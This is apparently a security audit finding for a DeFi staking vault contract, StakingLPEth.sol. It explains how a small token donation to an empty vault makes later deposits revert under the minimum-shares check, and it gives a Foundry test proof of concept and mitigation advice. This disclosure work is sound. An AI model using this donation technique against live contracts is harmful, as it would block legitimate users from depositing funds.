# Vulnerability details

## Impact
The `_checkMinShares()` validation in `StakingLPEth.sol` can be exploited by an attacker to make small donations that force the contract to reject valid deposit requests, potentially leading to a DoS and blocking legitimate users from interacting with the vault.

## Proof of Concept
`StakingLPEth.sol` uses `_checkMinShares()` on every [deposit](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/StakingLPEth.sol#L155), [withdraw](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/StakingLPEth.sol#L174) and [redeem](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/StakingLPEth.sol#L174) to prevent inflation attack:
```solidity
    /// @notice ensures a small non-zero amount of shares does not remain, exposing to donation attack
    function _checkMinShares() internal view {
        uint256 _totalSupply = totalSupply();
        if (_totalSupply > 0 && _totalSupply < MIN_SHARES) revert MinSharesViolation();
    }
```
```solidity
    uint256 private constant MIN_SHARES = 0.01 ether;
```
Although this check helps prevent profitable inflation attacks, an attacker could still cause a denial of service by manipulating the vault's state with a small donation when it is empty, effectively preventing new deposits.

Let's consider a scenario where Alice wants to deposit 100 ether:
- `totalAssets() == 0`, `totalSupply() == 0` and `_decimalsOffset == 0`
- Attacker donates (maliciously transfers) `10000 wei` to the `StakingLPEth`
- Now `totalAssets() == 10000 wei` while `totalSupply() == 0`
- Alice wants to deposit `100e18`
    - assets: 100 ether = 10^20 wei.
    - totalSupply: 0 (since no shares are minted yet).
    - totalAssets: 10000 wei (from the attacker's transfer).
    - _decimalsOffset: 0, so 10 ** _decimalsOffset() is 1.

### Calculation Breakdown
The formula used in `_convertToShares` is:
```solidity
    function _convertToShares(uint256 assets, Math.Rounding rounding) internal view virtual returns (uint256) {
        return assets.mulDiv(totalSupply() + 10 ** _decimalsOffset(), totalAssets() + 1, rounding);
    }
```
So:
- ${totalSupply} + 10^{_decimalsOffset} = 0 + 1 = 1$
- ${totalAssets}+1=10,000+1=10,001$
- ${shares}={assets}\times{{totalSupply}+1 \over {totalAssets}+1}$
    - ${shares}=10^{20}\times{{1} \over {10001}}$
    - ${{1}\over{10001}}≈9.999\times10^{-5}$
    - $shares=10^{20}\times{9.999}\times10^-5=9.999\times10^{15} shares$

The result of this calculation is approximately $9.999 \times 10^{15}$ shares, which is `9999000099990001` shares or `9.999e15` which is less than `MIN_SHARES` (`10e16` or `0.01 ether`)

Since $9.999 × 10^{15} < 10^{16}$, the condition `_totalSupply < MIN_SHARES` is true. This triggers the `MinSharesViolation` error, causing Alice's transaction to revet:
```solidity
        if (_totalSupply > 0 && _totalSupply < MIN_SHARES) revert MinSharesViolation();
```

In this scenario, the attacker was able to prevent deposits of values less than or equal to `100 ether` using a small donation of `10000 wei`, effectively causing a denial of service to `StakingLPEth`.

### Coded PoC
Above scenario is implemented in this test
Please add the following test to `StakingLP.t.sol`:
```solidity
    function test_DoSStakingLPETH() public {
        address alice = vm.addr(124556);
        address attacker = vm.addr(666);

        liquidityPool.transfer(alice, 100 ether);
        liquidityPool.transfer(attacker, 10000 wei);

        vm.startPrank(attacker);
        liquidityPool.transfer(address(stakingLpEth), 10000 wei);
        vm.stopPrank();

        assertEq(stakingLpEth.totalAssets(), 10000 wei);
        assertEq(stakingLpEth.totalSupply(), 0);

        vm.startPrank(alice);
        liquidityPool.approve(address(stakingLpEth), 100 ether);
        vm.expectRevert(StakingLPEth.MinSharesViolation.selector);
        stakingLpEth.deposit(100 ether, alice);
        vm.stopPrank();
    }
```
Run the test:
```bash
forge test --mt test_DoSStakingLPETH
```

## Recommended Mitigation Steps
Given that the `_checkMinShares()` is the core of the problem, I think you should implement other mechanisms to prevent inflation attacks instead of using a `MIN_SHARES` check.
- Morpho DAO mitigates inflation attacks by depositing assets into the vault upon initialization.
- YieldBox calculates the exchange rate by adding a "virtual" quantity of shares and assets to the vault.
- [More](https://blog.openzeppelin.com/a-novel-defense-against-erc4626-inflation-attacks)
